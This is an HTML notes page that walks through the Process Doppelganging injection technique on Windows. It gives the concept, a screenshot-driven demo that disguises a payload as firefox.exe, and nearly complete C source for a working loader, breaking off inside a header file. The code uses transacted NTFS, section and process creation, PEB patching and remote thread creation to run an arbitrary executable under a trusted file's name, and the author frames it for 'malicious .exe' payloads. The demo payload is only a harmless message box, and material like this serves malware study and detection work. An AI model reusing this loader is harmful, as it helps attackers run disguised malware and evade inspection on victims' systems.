<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Process Doppleganging</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Process Injection - Process Doppleganging</h1></strong><br />This is a technique first presented by Tal Liberman and Eugene Kogan at Black Hat Europe in 2017.<br />Their slides and a webinar can be found here:<br />• <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf</a><br />• <a href="https://www.youtube.com/watch?v=Cch8dvp836w">https://www.youtube.com/watch?v=Cch8dvp836w</a><br /><br />Process Doppleganging&#39;s primary use, in my opinion, is for loading a PE from memory.<br />Add your PE as a resource to your loader, or download it into memory, or whatever, and then use Process Doppleganging to run the PE from memory.<br /><br /><strong><h2>## Concept</h2></strong><br />The Process Doppleganging technique is centered around TxF, Transactional NTFS, first introduced by Microsoft in Windows Vista. <br />• <a href="https://en.wikipedia.org/wiki/Transactional_NTFS">https://en.wikipedia.org/wiki/Transactional_NTFS</a><br />• <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/about-transactional-ntfs">https://docs.microsoft.com/en-us/windows/win32/fileio/about-transactional-ntfs</a><br /><br />Transactional NTFS brought <em>atomic transactions</em>, a term found in database systems, to the Windows filesystem.<br /><br />An atomic transaction states that: either all the data gets written to the file, or nothing gets written.<br /><br />This Transactional NTFS file system effectively means that developers can write to files safely, because if the write operation doesn&#39;t complete in full, the file can be rolled back to its original state.<br /><br />Process Doppleganing makes use of this to &#39;write to file, reverse it&#39; functionality to temporarily write your payload to a file and create a process of it from memory.<br /><br />The basic concept of Process Doppleganging goes like this:<br />• write your payload into a dummy file<br />• create a section from that dummy file (which now contains your malware)<br />• create a process from that section<br />• roll back the dummy file to its original state (because it&#39;s not needed anymore)<br />• start a thread in the newly-created process to start execution<br /><br />Your malicious .exe will now be running and masquerading as whatever you chose as the dummy file - <code>calc.exe</code>, <code>hi.txt</code>, <code>explorer.exe</code>, etc.<br /><br />The only requirement is that you have write privileges to the dummy file.<br /><br />Process Doppleganing makes clever use of the fact that <code>NtCreateSection</code> returns a handle.<br />The handle from <code>NtCreateSection</code> can then be used to <code>NtCreateProcess</code>, at which point you&#39;ve successfully created a process of your malware.<br /><br /><strong><h2>## Examples &amp; Resrouces</h2></strong><br />• <a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-doppelganging">https://www.ired.team/offensive-security/code-injection-process-injection/process-doppelganging</a><br />• <a href="https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging">https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging</a><br />• <a href="https://github.com/hasherezade/process_doppelganging">https://github.com/hasherezade/process_doppelganging</a><br />• <a href="https://github.com/mdolmen/proc_dopp">https://github.com/mdolmen/proc_dopp</a><br />• <a href="https://github.com/owodelta/owoganger">https://github.com/owodelta/owoganger</a><br />• <a href="https://github.com/Spajed/processrefund">https://github.com/Spajed/processrefund</a><br /><br /><strong><h2>## Advantages</h2></strong><br />• A reliable technique to run processes from memory (providing you&#39;re on a suitable OS)<br /><br /><strong><h2>## Disadvantages</h2></strong><br />• Not entirely stealthy<br />   ◇ makes use of <code>NtCreateThreadEx</code>, which is commonly monitored by antivirus<br />• End result has only 1 evasive property - an unsuspicious name<br />   ◇ memory of the process can easily be inspected to see that it&#39;s a malicious <code>.exe</code><br />• Detected on Windows 10 by Windows Defender (tested on 1809)<br />• Unreliable on Windows 10 - high chance of causing BSOD, but works on Windows 8.1 to Vista<br /><br /><strong><h2>## Observations</h2></strong><br /><strong><h3>### 1</h3></strong><br />Your process isn&#39;t really hidden.<br />It will adopt the name of the dummy file - like <code>firefox.exe</code> - but when inspecting its memory you can see your entire malicious <code>.exe</code> and its loaded DLLs etc.<br /><br /><a href=""><img src="images/1641-1.png" alt="images/1641-1.png" /></a><br /><br /><a href=""><img src="images/1641-2.png" alt="images/1641-2.png" /></a><br /><br /><strong><h3>### 2</h3></strong><br />You can impersonate any file you want, it doesn&#39;t have to be an executable.<br />For example, text files.<br /><a href=""><img src="images/1641-3.png" alt="images/1641-3.png" /></a><br /><br /><a href=""><img src="images/1641-4.png" alt="images/1641-4.png" /></a><br /><br />Here you can see the original <code>hey.txt</code>, which is really just a text file.<br /><a href=""><img src="images/1641-5.png" alt="images/1641-5.png" /></a><br /><br /><strong><h2>## Demo</h2></strong><br />• I&#39;m running this demo on Windows 7 Ultimate x64 SP1.<br />• My code is running as Administrator because I&#39;m targeting <code>C:\\Program Files\\Mozilla Firefox\\firefox.exe</code>, to which only Administrator has write permissions.<br />   ◇ Your code doesn&#39;t have to run as Administrator, your user just needs to have write permissions to your target dummy file<br />   ◇ Testing suggestion: copy binaries from system32 into your own folder and use those as dummy files<br /><br />My malicious <code>.exe</code> is a simple MessageBox program compiled as <code>Release x64</code>.<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;Windows.h&gt;<br /><br />int&nbsp;WINAPI&nbsp;wWinMain(HINSTANCE&nbsp;hInstance,&nbsp;HINSTANCE&nbsp;hPrevInstance,&nbsp;PWSTR&nbsp;pCmdLine,&nbsp;int&nbsp;nCmdShow)<br /><span style="color:#000000;font-weight:400">{</span><br />	MessageBoxA(NULL,&nbsp;&quot;i&#39;m&nbsp;a&nbsp;doppleganger&nbsp;:)&quot;,&nbsp;&quot;hey&quot;,&nbsp;MB_OK);<br />	<br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><a href=""><img src="images/1641-6.png" alt="images/1641-6.png" /></a><br /><br /><strong><h3>### Limitations</h3></strong><br />• My code doesn&#39;t work on Windows 10 (tested on 1809). <br />   ◇ <code>NtCreateThreadEx</code> returns with 0xC0000022 - ACCESS_VIOLATION.<br />• My code only works with x64 payloads (dummy file can be anything though).<br /><br /><strong><h3>### Demo</h3></strong><br />First we create a transacted file of our dummy file.<br />In this case, that&#39;s <code>firefox.exe</code>.<br />In the handles of our doppleganging process, we see a handle with the description &quot;doppleganging :)&quot;.<br /><a href=""><img src="images/1641-7.png" alt="images/1641-7.png" /></a><br /><br />Next our malicous <code>.exe</code> (our payload) has been written into memory (because in this example we&#39;re using a file on disk) and gets written into the transacted <code>firefox.exe</code> file.<br /><br />Unfortunately, I can&#39;t examine the file with HxD or anything because it&#39;s currently being used by our process. We just have to take its word for it.<br /><a href=""><img src="images/1641-8.png" alt="images/1641-8.png" /></a><br /><br />Next, our process creates a section of the transacted <code>firefox.exe</code>, which currently contains our payload.<br />In the handles of our doppleganging process you can see a handle to the section.<br /><a href=""><img src="images/1641-9.png" alt="images/1641-9.png" /></a><br /><br />Now we rollback <code>firefox.exe</code> to its original state because we&#39;ve grabbed our malicious section from it, and we create a process using that section.<br />In Process Hacker you&#39;ll see it&#39;s called <code>firefox.exe</code>, and its memory is currently pretty empty.<br /><br />We also grab the new process&#39;s base address and entry point for later use.<br /><a href=""><img src="images/1641-10.png" alt="images/1641-10.png" /></a><br /><br />For the process to start correctly, we set its process parameters.<br /><br />Our process creates and fills a process parameters struct, allocates 32kb of space for the process parameters struct in the target process at <code>0x005c0000</code>, and then copies the process parameters struct into the target at <code>0x005c6470</code>. <br /><br />We then update to the pointer to the ProcessParameters struct in the target process&#39;s PEB to point to our new process parameters block at <code>0x005c6470</code>.<br /><a href=""><img src="images/1641-11.png" alt="images/1641-11.png" /></a><br /><br />The last step is create a thread in the spawned process at its entry point to begin execution.<br />We see our doppleganger process running as <code>firefox.exe</code>!<br /><a href=""><img src="images/1641-12.png" alt="images/1641-12.png" /></a><br /><br /><strong><h2>## Code</h2></strong><br />This code only works on Windows 7!<br /><br /><strong><h3>### main.c</h3></strong><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;ktmw32.h&gt;<br />#include&nbsp;&lt;Shlwapi.h&gt;<br /><br />#include&nbsp;&quot;nt.h&quot;<br /><br />#pragma&nbsp;comment(lib,&nbsp;&quot;KtmW32.lib&quot;)<br />#pragma&nbsp;comment(lib,&nbsp;&quot;Shlwapi.lib&quot;)<br /><br />/*<br />Get&nbsp;pointer&nbsp;to&nbsp;PEB&nbsp;in&nbsp;remote&nbsp;process&nbsp;using&nbsp;undocumented&nbsp;functions.<br />*/<br />LPVOID&nbsp;GetRemotePEB(HANDLE&nbsp;hProcess)<br />{<br />	PROCESS_BASIC_INFORMATION&nbsp;pbi;<br /><br />	NTSTATUS&nbsp;ntStatus;<br /><br />	ntStatus&nbsp;=&nbsp;d_NtQueryInformationProcess(hProcess,&nbsp;ProcessBasicInformation,&nbsp;&amp;pbi,&nbsp;sizeof(PROCESS_BASIC_INFORMATION),&nbsp;0);<br /><br />	return&nbsp;pbi.PebBaseAddress;<br />}<br /><br />/*<br />Get&nbsp;ImageBaseAddress&nbsp;of&nbsp;remote&nbsp;process&nbsp;via&nbsp;PEB&nbsp;using&nbsp;undocumented&nbsp;functions.<br />Return:<br />	NULL&nbsp;on&nbsp;failure.<br />	ImageBaseAddress&nbsp;on&nbsp;success.<br />*/<br />LPVOID&nbsp;GetRemoteImageBase_NT(HANDLE&nbsp;hProcess)<br />{<br />	LPVOID&nbsp;remoteImageBase&nbsp;=&nbsp;NULL;<br />	PROCESS_BASIC_INFORMATION&nbsp;pbi;<br />	myPEB&nbsp;peb&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br /><br />	NTSTATUS&nbsp;ntStatus;<br /><br />	ntStatus&nbsp;=&nbsp;d_NtQueryInformationProcess(hProcess,&nbsp;ProcessBasicInformation,&nbsp;&amp;pbi,&nbsp;sizeof(PROCESS_BASIC_INFORMATION),&nbsp;0);<br />	if&nbsp;(NT_SUCCESS(ntStatus)&nbsp;!=&nbsp;TRUE)&nbsp;{<br />		return&nbsp;NULL;<br />	}<br />	<br />	ntStatus&nbsp;=&nbsp;d_NtReadVirtualMemory(hProcess,&nbsp;pbi.PebBaseAddress,&nbsp;&amp;peb,&nbsp;sizeof(peb),&nbsp;NULL);<br />	if&nbsp;(NT_SUCCESS(ntStatus)&nbsp;!=&nbsp;TRUE)&nbsp;{<br />		return&nbsp;NULL;<br />	}<br /><br />	//remoteImageBase&nbsp;=&nbsp;peb.Reserved3[2];<br />	remoteImageBase&nbsp;=&nbsp;peb.ImageBaseAddress;<br /><br />	return&nbsp;remoteImageBase;<br />}<br /><br /><br />int&nbsp;ProcessDoppleganging(wchar_t&nbsp;target_file[],&nbsp;wchar_t&nbsp;payload_file[])<br />{<br />	NTSTATUS&nbsp;ntStatus;<br />	BOOL&nbsp;bRet&nbsp;=&nbsp;FALSE;<br />	DWORD&nbsp;dwBytesRead&nbsp;=&nbsp;0;<br />	DWORD&nbsp;dwBytesWritten&nbsp;=&nbsp;0;<br /><br />	printf(&quot;target:&nbsp;%ws&nbsp;\n&quot;,&nbsp;target_file);<br />	printf(&quot;payload:&nbsp;%ws&nbsp;\n\n&quot;,&nbsp;payload_file);<br /><br />	//&nbsp;create&nbsp;a&nbsp;transaction&nbsp;object<br />	HANDLE&nbsp;hTransaction&nbsp;=&nbsp;NULL;<br />	wchar_t&nbsp;description[]&nbsp;=&nbsp;L&quot;doppleganging&nbsp;:)&quot;;<br /><br />	hTransaction&nbsp;=&nbsp;CreateTransaction(NULL,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;description);<br /><br />	if&nbsp;(hTransaction&nbsp;==&nbsp;INVALID_HANDLE_VALUE)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;transaciton&quot;);<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[*]&nbsp;transaction&nbsp;handle:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;hTransaction);<br /><br />	//&nbsp;create&nbsp;transacted&nbsp;file&nbsp;of&nbsp;target&nbsp;file<br />	HANDLE&nbsp;hTransactedFile&nbsp;=&nbsp;NULL;<br />	hTransactedFile&nbsp;=&nbsp;CreateFileTransactedW(target_file,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;OPEN_EXISTING,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL,&nbsp;hTransaction,&nbsp;NULL,&nbsp;NULL);<br /><br />	if&nbsp;(hTransactedFile&nbsp;==&nbsp;INVALID_HANDLE_VALUE)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;created&nbsp;transacted&nbsp;file&nbsp;of&nbsp;target:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[*]&nbsp;created&nbsp;transacted&nbsp;file&nbsp;of:&nbsp;%ws&nbsp;\n&quot;,&nbsp;PathFindFileNameW(target_file));<br /><br />	//&nbsp;open&nbsp;payload&nbsp;file&nbsp;&amp;&nbsp;get&nbsp;size<br />	HANDLE&nbsp;payload_hFile&nbsp;=&nbsp;NULL;<br />	payload_hFile&nbsp;=&nbsp;CreateFileW(payload_file,&nbsp;GENERIC_READ,&nbsp;0,&nbsp;NULL,&nbsp;OPEN_EXISTING,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br /><br />	if&nbsp;(payload_hFile&nbsp;==&nbsp;INVALID_HANDLE_VALUE)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;open&nbsp;payload&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[*]&nbsp;opened&nbsp;payload:&nbsp;%ws&nbsp;\n&quot;,&nbsp;PathFindFileNameW(payload_file));<br /><br />	DWORD&nbsp;payload_FileSize&nbsp;=&nbsp;0;<br />	payload_FileSize&nbsp;=&nbsp;GetFileSize(payload_hFile,&nbsp;NULL);<br />	printf(&quot;\t&nbsp;size:&nbsp;%d&nbsp;\n&quot;,&nbsp;payload_FileSize);<br /><br />	//&nbsp;allocate&nbsp;local&nbsp;buffer&nbsp;for&nbsp;payload&nbsp;&amp;&nbsp;read&nbsp;payload&nbsp;into&nbsp;buffer<br />	LPVOID&nbsp;payload_Buffer&nbsp;=&nbsp;NULL;<br /><br />	payload_Buffer&nbsp;=&nbsp;VirtualAlloc(NULL,&nbsp;payload_FileSize,&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_READWRITE);<br />	if&nbsp;(payload_Buffer&nbsp;==&nbsp;NULL)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;allocate&nbsp;local&nbsp;memory&nbsp;for&nbsp;payload&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br />	printf(&quot;\t&nbsp;allocated&nbsp;local&nbsp;buffer&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;payload_Buffer);<br /><br />	bRet&nbsp;=&nbsp;ReadFile(payload_hFile,&nbsp;payload_Buffer,&nbsp;payload_FileSize,&nbsp;&amp;dwBytesRead,&nbsp;NULL);<br />	if&nbsp;(bRet&nbsp;==&nbsp;FALSE)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;read&nbsp;payload&nbsp;into&nbsp;buffer&nbsp;@&nbsp;0x%p:&nbsp;%d&nbsp;\n&quot;,&nbsp;payload_Buffer,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;\t&nbsp;read&nbsp;payload&nbsp;into&nbsp;buffer&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;payload_Buffer);<br /><br />	//&nbsp;write&nbsp;payload&nbsp;into&nbsp;transacted&nbsp;file<br />	bRet&nbsp;=&nbsp;WriteFile(hTransactedFile,&nbsp;payload_Buffer,&nbsp;payload_FileSize,&nbsp;&amp;dwBytesWritten,&nbsp;NULL);<br />	if&nbsp;(bRet&nbsp;==&nbsp;FALSE)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;write&nbsp;payload&nbsp;into&nbsp;transaction:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[*]&nbsp;payload&nbsp;file&nbsp;has&nbsp;overwritten&nbsp;target&nbsp;transacted&nbsp;file:&nbsp;%ws&nbsp;\n&quot;,&nbsp;PathFindFileNameW(target_file));<br /><br />	//&nbsp;create&nbsp;section&nbsp;from&nbsp;transacted&nbsp;file&nbsp;&amp;&nbsp;reverse&nbsp;transacted&nbsp;file&nbsp;to&nbsp;its&nbsp;orginal&nbsp;state<br />	HANDLE&nbsp;hTransactedSection&nbsp;=&nbsp;NULL;<br /><br />	ntStatus&nbsp;=&nbsp;d_NtCreateSection(&amp;hTransactedSection,&nbsp;SECTION_ALL_ACCESS,&nbsp;NULL,&nbsp;0,&nbsp;PAGE_READONLY,&nbsp;SEC_IMAGE,&nbsp;hTransactedFile);<br />	if&nbsp;(NT_SUCCESS(ntStatus)&nbsp;!=&nbsp;TRUE)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;section&nbsp;from&nbsp;transacted&nbsp;file&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[*]&nbsp;section&nbsp;created&nbsp;from&nbsp;transacted&nbsp;file:&nbsp;%ws&nbsp;\n&quot;,&nbsp;PathFindFileNameW(target_file));<br /><br />	//&nbsp;create&nbsp;process&nbsp;from&nbsp;transacted&nbsp;section<br />	HANDLE&nbsp;target_hProcess&nbsp;=&nbsp;NULL;<br />	<br />	ntStatus&nbsp;=&nbsp;d_NtCreateProcessEx(&amp;target_hProcess,&nbsp;PROCESS_ALL_ACCESS,&nbsp;NULL,&nbsp;GetCurrentProcess(),&nbsp;PS_INHERIT_HANDLES,&nbsp;hTransactedSection,&nbsp;NULL,&nbsp;NULL,&nbsp;FALSE);<br />	if&nbsp;(NT_SUCCESS(ntStatus)&nbsp;!=&nbsp;TRUE)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;process&nbsp;from&nbsp;transacted&nbsp;section:&nbsp;0x%.8x&nbsp;\n&quot;,&nbsp;ntStatus);<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[*]&nbsp;created&nbsp;process&nbsp;from&nbsp;transacted&nbsp;section.&nbsp;handle:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_hProcess);<br /><br />	//&nbsp;grab&nbsp;entry&nbsp;point&nbsp;of&nbsp;created&nbsp;process&nbsp;(created&nbsp;process&#39;&nbsp;ImageBase&nbsp;+&nbsp;payload&#39;s&nbsp;AddressOfEntryPoint)<br />	PIMAGE_DOS_HEADER&nbsp;payload_DosHeader&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)payload_Buffer;<br />	PIMAGE_NT_HEADERS&nbsp;payload_NtHeader&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)payload_Buffer&nbsp;+&nbsp;payload_DosHeader-&gt;e_lfanew);<br />	<br />	LPVOID&nbsp;target_ImageBaseAddress&nbsp;=&nbsp;NULL;<br />	LPVOID&nbsp;target_EntryPoint&nbsp;=&nbsp;NULL;<br />	target_ImageBaseAddress&nbsp;=&nbsp;GetRemoteImageBase_NT(target_hProcess);<br />	target_EntryPoint&nbsp;=&nbsp;(LPVOID)((DWORD_PTR)target_ImageBaseAddress&nbsp;+&nbsp;(DWORD_PTR)payload_NtHeader-&gt;OptionalHeader.AddressOfEntryPoint);<br />	<br />	printf(&quot;\t&nbsp;base&nbsp;address:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_ImageBaseAddress);<br />	printf(&quot;\t&nbsp;entry&nbsp;point:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_EntryPoint);<br /><br />	//&nbsp;create&nbsp;process&nbsp;parameters&nbsp;block<br />	UNICODE_STRING&nbsp;target_file_UNICODE;<br />	d_RtlInitUnicodeString(&amp;target_file_UNICODE,&nbsp;target_file);<br /><br />	myPRTL_USER_PROCESS_PARAMETERS&nbsp;ProcessParameters&nbsp;=&nbsp;NULL;<br />	ntStatus&nbsp;=&nbsp;d_RtlCreateProcessParametersEx(&amp;ProcessParameters,&nbsp;&amp;target_file_UNICODE,&nbsp;NULL,&nbsp;NULL,&nbsp;&amp;target_file_UNICODE,&nbsp;NULL,&nbsp;NULL,&nbsp;NULL,&nbsp;NULL,&nbsp;NULL,&nbsp;RTL_USER_PROCESS_PARAMETERS_NORMALIZED);<br />	if&nbsp;(NT_SUCCESS(ntStatus)&nbsp;!=&nbsp;TRUE)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;process&nbsp;parameters&nbsp;block:&nbsp;0x%.8x&nbsp;\n&quot;,&nbsp;ntStatus);<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[*]&nbsp;created&nbsp;ProcessParameters&nbsp;locally&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;ProcessParameters);<br /><br />	//&nbsp;allocate&nbsp;memory&nbsp;in&nbsp;target&nbsp;process&nbsp;and&nbsp;write&nbsp;process&nbsp;parameters&nbsp;block<br />	SIZE_T&nbsp;blockSize&nbsp;=&nbsp;0;<br />	blockSize&nbsp;=&nbsp;ProcessParameters-&gt;EnvironmentSize&nbsp;+&nbsp;ProcessParameters-&gt;MaximumLength;<br />	<br />	LPVOID&nbsp;target_ProcessParametersAddr&nbsp;=&nbsp;NULL;<br />	target_ProcessParametersAddr&nbsp;=&nbsp;VirtualAllocEx(target_hProcess,&nbsp;ProcessParameters,&nbsp;blockSize,&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_READWRITE);<br />	if&nbsp;(target_ProcessParametersAddr&nbsp;==&nbsp;NULL)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;allocate&nbsp;memory&nbsp;in&nbsp;target&nbsp;process&nbsp;for&nbsp;process&nbsp;parameters:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;\t&nbsp;allocated&nbsp;memory&nbsp;in&nbsp;target&nbsp;for&nbsp;process&nbsp;parameters&nbsp;block&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_ProcessParametersAddr);<br /><br />	bRet&nbsp;=&nbsp;WriteProcessMemory(target_hProcess,&nbsp;ProcessParameters,&nbsp;ProcessParameters,&nbsp;blockSize,&nbsp;NULL);<br />	if&nbsp;(bRet&nbsp;==&nbsp;FALSE)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;write&nbsp;process&nbsp;parameters&nbsp;block&nbsp;into&nbsp;target:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;\t&nbsp;wrote&nbsp;process&nbsp;parameters&nbsp;block&nbsp;into&nbsp;target&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;ProcessParameters);<br /><br />	//&nbsp;update&nbsp;PEB-&gt;ProcessParameters&nbsp;pointer&nbsp;in&nbsp;target&nbsp;process&nbsp;to&nbsp;point&nbsp;to&nbsp;newly&nbsp;written&nbsp;block<br />	LPVOID&nbsp;target_PebBaseAddress&nbsp;=&nbsp;NULL;<br />	target_PebBaseAddress&nbsp;=&nbsp;GetRemotePEB(target_hProcess);<br /><br />	myPPEB&nbsp;target_peb&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	target_peb&nbsp;=&nbsp;target_PebBaseAddress;<br /><br />	printf(&quot;[*]&nbsp;target&nbsp;peb:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_PebBaseAddress);<br />	printf(&quot;[*]&nbsp;target&nbsp;peb.ProcessParameters:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;&amp;target_peb-&gt;ProcessParameters);<br /><br />	printf(&quot;[*]&nbsp;writing&nbsp;0x%p&nbsp;into&nbsp;target&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;ProcessParameters,&nbsp;&amp;target_peb-&gt;ProcessParameters);<br />	bRet&nbsp;=&nbsp;WriteProcessMemory(target_hProcess,&nbsp;&amp;target_peb-&gt;ProcessParameters,&nbsp;&amp;ProcessParameters,&nbsp;sizeof(LPVOID),&nbsp;NULL);<br />	if&nbsp;(bRet&nbsp;==&nbsp;FALSE)&nbsp;{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;write&nbsp;updated&nbsp;PEB-&gt;ProcessParameters&nbsp;pointer&nbsp;into&nbsp;target&nbsp;process&nbsp;@&nbsp;0x%p:&nbsp;%d&nbsp;\n&quot;,&nbsp;&amp;target_peb-&gt;ProcessParameters,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[*]&nbsp;updated&nbsp;PEB-&gt;ProcessParameters&nbsp;pointer&nbsp;in&nbsp;target&nbsp;@&nbsp;0x%p&nbsp;to&nbsp;0x%p&nbsp;\n&quot;,&nbsp;&amp;target_peb-&gt;ProcessParameters,&nbsp;ProcessParameters);<br /><br />	//&nbsp;create&nbsp;thread&nbsp;in&nbsp;target&nbsp;process&nbsp;to&nbsp;execute<br />	HANDLE&nbsp;target_hThread&nbsp;=&nbsp;NULL;<br /><br />	ntStatus&nbsp;=&nbsp;d_NtCreateThreadEx(&amp;target_hThread,&nbsp;THREAD_ALL_ACCESS,&nbsp;NULL,&nbsp;target_hProcess,&nbsp;(LPTHREAD_START_ROUTINE)target_EntryPoint,&nbsp;NULL,&nbsp;FALSE,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;NULL);<br />	if&nbsp;(NT_SUCCESS(ntStatus)&nbsp;!=&nbsp;TRUE)&nbsp;<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;created&nbsp;thread&nbsp;in&nbsp;target&nbsp;at&nbsp;entry&nbsp;point:&nbsp;0x%p&nbsp;|&nbsp;ntstatus:&nbsp;0x%.8x&nbsp;\n&quot;,&nbsp;target_EntryPoint,&nbsp;(DWORD)ntStatus);<br /><br />		bRet&nbsp;=&nbsp;RollbackTransaction(hTransaction);<br />		if&nbsp;(bRet&nbsp;==&nbsp;FALSE)&nbsp;{<br />			printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;roll&nbsp;back&nbsp;transaction:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />			return&nbsp;1;<br />		}<br /><br />		printf(&quot;[*]&nbsp;rolled&nbsp;back&nbsp;transacted&nbsp;target&nbsp;file:&nbsp;%ws&nbsp;\n&quot;,&nbsp;PathFindFileNameW(target_file));<br />	}<br />	else<br />	{<br />		printf(&quot;[*]&nbsp;thread&nbsp;created&nbsp;in&nbsp;target&nbsp;process&nbsp;at&nbsp;entry&nbsp;point:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_EntryPoint);<br />	}<br />	<br />	//&nbsp;clean&nbsp;up<br />	printf(&quot;[*]&nbsp;cleaning&nbsp;up&nbsp;\n&quot;);<br />	CloseHandle(hTransaction);<br />	CloseHandle(hTransactedFile);<br />	CloseHandle(payload_hFile);<br />	VirtualFree(payload_Buffer,&nbsp;0,&nbsp;MEM_RELEASE);<br />	d_NtClose(hTransactedSection);<br />	d_NtClose(target_hProcess);<br />	d_RtlDestroyProcessParameters(ProcessParameters);<br />	d_NtClose(target_hThread);<br /><br />	return&nbsp;0;<br />}<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	DWORD&nbsp;dwRet&nbsp;=&nbsp;resolveNtFunctions();<br />	if&nbsp;(dwRet&nbsp;!=&nbsp;0)<br />	{<br />		printf(&quot;[*]&nbsp;failed&nbsp;to&nbsp;resolve&nbsp;NT&nbsp;function&nbsp;#%d&nbsp;\n&quot;,&nbsp;dwRet);<br />		return&nbsp;0;<br />	}<br /><br />#ifdef&nbsp;_WIN64<br />	wchar_t&nbsp;target_file[]&nbsp;=&nbsp;L&quot;C:\\Users\\Bob\\source\\samples\\techniques\\process_injection\\doppleganging2\\calc64.exe&quot;;<br />	//wchar_t&nbsp;payload_file[]&nbsp;=&nbsp;L&quot;C:\\Users\\Bob\\source\\samples\\hello\\hello_gui\\x64\\Release\\hello_gui.exe&quot;;<br />	wchar_t&nbsp;payload_file[]&nbsp;=&nbsp;L&quot;C:\\Users\\Bob\\source\\samples\\mal\\x64\\Release\\mal.exe&quot;;<br />#else<br />	wchar_t&nbsp;target_file[]&nbsp;=&nbsp;L&quot;C:\\Users\\Bob\\source\\samples\\techniques\\process_injection\\doppleganging2\\calc32.exe&quot;;<br />	wchar_t&nbsp;payload_file[]&nbsp;=&nbsp;L&quot;C:\\Users\\Bob\\source\\samples\\hello\\hello_gui\\Release\\hello_gui.exe&quot;;<br />#endif<br /><br />	ProcessDoppleganging(target_file,&nbsp;payload_file);<br />	<br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h3>### nt.h</h3></strong><br /><div class="codebox"><div class="codebox">#pragma&nbsp;once<br /><br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;winternl.h&gt;<br /><br />int&nbsp;resolveNtFunctions();	//&nbsp;function&nbsp;in&nbsp;nt.c&nbsp;to&nbsp;resolve&nbsp;NT&nbsp;functions<br /><br />//&nbsp;custom<br 